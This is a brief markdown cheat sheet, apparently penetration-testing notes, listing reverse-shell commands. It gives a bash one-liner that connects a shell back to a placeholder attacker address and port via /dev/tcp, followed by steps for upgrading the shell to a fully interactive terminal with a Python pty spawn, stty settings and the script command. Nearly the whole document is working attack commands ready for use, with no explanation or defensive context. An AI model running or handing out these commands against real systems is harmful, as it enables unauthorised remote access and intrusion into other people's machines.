# Reverse Shells - Examples

## Bash

	bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<NETCAT_PORT> 0>&1"


## Fully interactive shell

In the reverse shell write

	python3 -c 'import pty;pty.spawn("/bin/bash")'

Put nc in the background
	CTRL+Z

	stty raw -echo
	fg
	export TERM=xterm


## Cookbook

Ugrading the the reverse shell we got

	script /dev/null -c bash